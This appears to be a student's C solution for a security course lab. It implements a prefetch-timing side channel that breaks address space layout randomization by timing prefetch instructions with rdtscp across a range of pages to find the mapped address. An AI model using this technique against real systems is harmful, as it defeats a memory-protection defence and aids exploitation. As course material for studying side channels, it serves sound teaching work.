/*
 * Address Space Layout Randomization
 * Part 1B: Prefetch
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <time.h>
#include <mmintrin.h>
#include <xmmintrin.h>
#include <fcntl.h>
#include <errno.h>
#include <stdbool.h>
#include <x86intrin.h>
#include "lab.h"

void warm_up_pc();
void prefetch(void *addr);
void mem_fence();
uint64_t rdtscp1(uint32_t *cpu_id);
/*
 * Part 1
 * Find and return the single mapped address within the range [low_bound, upper_bound).
 */
uint64_t find_address(uint64_t low_bound, uint64_t high_bound) {
    warm_up_pc();
    uint64_t valid_addr = 0;
    long min = 1 << 30;
    uint32_t cpu_s, cpu_e;
    long start , end , dt;
    for (uint64_t addr = low_bound; addr < high_bound; addr += PAGE_SIZE) {
        mem_fence();
        start = rdtscp1(&cpu_s);
        prefetch(addr);
        end = rdtscp1(&cpu_e);
        if (cpu_s != cpu_e) {
            addr -= PAGE_SIZE;
            continue;
        }
        mem_fence();
        dt = end - start;
        if (dt < min) {
            min = dt;
            valid_addr = addr;
        }
        // TODO: Figure out if "addr" is the correct address or not.
    }
    return valid_addr;
}

void warm_up_pc()
{
    int tmp1 = 0;
    for (int i = 0 ; i < 10000000 ; i++) {
        tmp1 += rand();
    }
    printf("%d\n", tmp1);
}

void prefetch(void *p) {
    asm volatile ("prefetchnta (%0)" : : "r" (p));
    asm volatile ("prefetcht2 (%0)" : : "r" (p));
}

void mem_fence() {
    asm volatile("mfence" ::: "memory");
}

uint64_t rdtscp1(uint32_t *cpu_id) {
    uint32_t lo, hi;
    uint32_t aux;

    // Use RDTSCP instruction to get the TSC and CPU ID
    asm volatile(
        "rdtscp"                 // Read the TSC and CPU ID
        : "=a"(lo), "=d"(hi), "=c"(aux)  // Output: lo (low), hi (high), aux (processor ID)
        :                          // No inputs
        : "memory"                // Memory clobbered
    );

    // Store CPU ID (processor ID) in the provided variable
    *cpu_id = aux;

    // Combine the low and high parts of the TSC into a 64-bit value
    return ((uint64_t)hi << 32) | lo;
}